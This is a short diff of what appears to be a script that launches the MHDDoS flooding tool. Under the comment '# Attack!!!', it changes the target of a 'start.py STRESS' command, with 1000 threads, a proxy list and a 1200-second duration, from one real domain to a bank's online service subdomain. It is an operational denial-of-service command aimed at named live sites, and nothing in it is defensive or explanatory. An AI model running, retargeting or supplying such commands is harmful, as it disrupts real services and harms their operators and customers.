@@ -10,4 +10,4 @@ cd MHDDoS/
 > proxy.list
 
 # Attack!!!
-python3 start.py STRESS https://www.datec.com.bo/ 1 1000 proxy.list 1000 1200
+python3 start.py STRESS https://puntospopular.bancopopular.hn 1 1000 proxy.list 1000 1200
